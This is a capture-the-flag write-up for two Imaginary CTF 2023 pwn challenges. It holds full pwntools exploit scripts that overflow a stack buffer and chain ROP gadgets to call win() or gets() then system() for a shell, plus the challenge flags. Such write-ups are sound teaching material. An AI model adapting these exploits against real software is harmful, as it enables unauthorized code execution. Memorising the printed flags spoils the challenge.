# Imaginary CTF 2023 `ret2win ret2lose [pwn]` writeup

## Challenge
Can you overflow the buffer and get the flag? (Hint: if your exploit isn't working on the remote server, look into stack alignment)

`nc ret2win.chal.imaginaryctf.org 1337`

You can get the binary file and its source code.

## Solusion & Exploit
### ret2win
The goal of "ret2win" is to call `win()` function.

There are no other specific concerns to be aware of, aside from stack alignment.

```py
from pwn import *
import sys

elf = ELF("vuln")

# io = process(elf.path)
io = remote("ret2win.chal.imaginaryctf.org", 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

p = b'A' * 0x48
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(elf.sym["win"])

io.sendline(p)

io.interactive()
```

FLAG: `ictf{r3turn_0f_th3_k1ng?}`

### ret2lose
The goal of "ret2lose" is to get the shell.

There is `system()` function in the binary, but no convinient gadget like `pop rdi; ret`.

How about achieving ret2libc to supplement the missing gadgets?
Without an output function, you should quickly realize that address leak would be difficult.

...There are not many gadgets available, but when the `gets()` function returns, the RDI register is set with a writable address. Writing `/bin/sh` to this address and calling the `system()` function could be a potential approach.

It probably won't work as expected.
When analyzing it with GDB, you may notice that the argument of the `system()` function becomes `/bin.sh`!

The address you are trying to write to is the `_IO_lock_t` structure of standard input. The `_IO_lock_t.cnt` gets decremented at the end of `gets() function`, causing the 5th byte of the string to be overwritten.

```py
from pwn import *
import sys

elf = ELF("vuln")

# io = process(elf.path)
io = remote("ret2win.chal.imaginaryctf.org", 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

p = b'A' * 0x48
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(elf.sym["gets"])
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(elf.sym["system"])

io.sendline(p)

io.sendline(b'sh\x00AAAAAA')
io.interactive()
```

FLAG: `ictf{ret2libc?_what_libc?}`